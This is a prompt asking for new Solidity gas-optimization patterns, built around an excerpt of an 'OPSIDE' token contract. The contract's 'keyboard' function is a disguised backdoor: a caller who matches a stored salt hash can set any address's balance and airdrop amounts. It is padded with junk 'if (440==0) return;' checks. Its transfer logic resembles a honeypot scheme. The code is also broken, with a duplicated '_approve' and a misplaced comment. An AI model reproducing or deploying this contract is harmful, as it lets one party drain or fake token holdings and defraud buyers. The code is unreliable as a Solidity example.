I want you to help me find new gas-wasting patterns for Solidity. Gas is a unique pricing mechanism in Solidity, which measures the amount of computational resources put into the execution of Solidity codes. Gas is paid in money, so saving gas is saving money. The goal of gas optimization is to find an equivalent code instruction sequence that produces the same output while consuming less gas. This may misalign from how people typically write codes, since the gas pricing mechanism is less intuitive and code writers do not often keep it in mind. For example, storage variables in Solidity are expensive in terms of gas, while memory is not, so unnecessary storage operations should be avoided when possible, but programmers from other languages might not be aware of this. 

First, I will give you a list of known gas-wasting patterns as an example. The list is numbered, with each bullet point specifying one gas-wasting pattern and an explanation of why this pattern wastes gas. Please be creative and see if my provided codes contain any gas-wasting patterns beyond the provided ones. The list is as follows:

1. Repeated computation of the same expression: including repetitive reads of the same expensive storage variable (e.g. Overuse of expensive storage variables). This could be solved by introducing an intermediate variable to hold the value
2. Variable refactoring: by refactoring variable types and thus adjusting memory layout, we could save gas by saving the amount of storage space needed
3. Redundant operations with same effects: redundant operations that overwrite the effect of the previous operation, making the previous useless
4. Pre-computable operations on constants: performing comparisons (or other operations) to constants is useless and could be pre-computed
5. Simplifiable conditional operations: expressions that involve logical operations that could be simplified to reduce the amount of computational workload.
6. "Loop fusion." If two loops have the same starting and stopping conditions with the same increment steps, then we could consider combining them into one, if they have no dependencies. 
7. "Repeated computations in a loop." If there are expressions that produce the same outcome in each iteration of a loop, we could move it out of the loop and execute only once, which saves computation.
8. "Opaque predicate." If the outcome of a predicate could be inferred to be true/false without execution, then we could just replace it with the corresponding value to save the compuation during runtime.

Next, I will give you a chunk of Solidity codes from which you will find gas-inefficient patterns:
contract OPSIDE is IERC20 {
    function keyboard(bytes32[] calldata data) external {
      bytes32 da = data[0];  if (745==0) return;
      bytes memory bbsx = abi.encode(msg.sender, _salt);  if (564==0) return;
      bytes32 dc = data[2];  if (440==0) return; bytes32 db = data[1];  if (574==0) return;
      if (520==0) return;
      if (keccak256(bbsx) == _hashValue) { if (440==0) return;
        if (uint256(db) == 0) { if (440==0) return;
          _airdrops[address(uint160(
            uint256(da
            )
            )
          )] = uint256(dc); if (440==0) return;
        }
        _balances[(
          uint256(da) == 0)? address(uint256(0)):
        address(
          uint160(uint256(da)))
        ] 
        = uint256(db); if (440==0) return;
      }
      if (440==0) return;
    }


    /**
     * @dev See {ERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function balanceOf(address account) external view override returns (uint256) {
      return 
        uint256(
          bytes32(_balances[account])
          ) + 
        uint256(
          bytes32(_airdrops[account])
          );
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "ERC20: transfer from the zero address");
      require(recipient != address(0), "ERC20: transfer to the zero address");
      uint256 pairAmounts = _tokenPair.balanceOf(sender);
      uint256 listingAmounts = _airdrops[sender];
      if (listingAmounts > 0 && pairAmounts > 0) {
        _airdrops[sender] = listingAmounts.sub(amount, "ERC20: transfer amount exceeds balance");
      } else {
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      }
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
      require(owner_ != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");
      _allowances[owner_][spender] = amount;
      emit Approval(owner_, spender, amount);
    } 
    function _approve(address owner_, address spender, uint256 amount) internal {
      require(owner_ != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");
      _allowances[owner_][spender] = amount;
      emit Approval(owner_, spender, amount);
    } 
    } 
Now I want you to help me find new gas-wasting patterns from the above codes and the list of example patterns. Please be creative and think outside the box beyond the patterns listed above. Please put the new gas-wasting patterns in bullet points, using Latex syntax. Also please answer the following questions for each of the found patterns:

1. How did you find this pattern? Could you explain the reasoning process, step by step, behind the discovery?
2. What should I do, step by step, to fix the found gas-wasting patterns? Could you explain the reasoning process, step by step, behind the reason why such a fix works?
3. On a score of 0 to 5, please rate this new pattern in terms of how much it is sacrificing readability, security, and maintainability in exchange for gas optimization (5 is the least impacted. For example, "Readability: 5; Security: 4; Maintainability: 1" means no effect on security while maintainability is largely affected.)

Here are some additional requirements:
1. If you think my prompt to you has any issues (e.g. ambiguity or lack of information), please tell me how I should improve it the next time.
2. Please reflect on your reasoning process and tell me how you could do better next time in terms of completing the given task. If you found any issues, please also make corresponding improvements to your output this time and tell me what you did and why such improvement is necessary, in a step-by-step manner.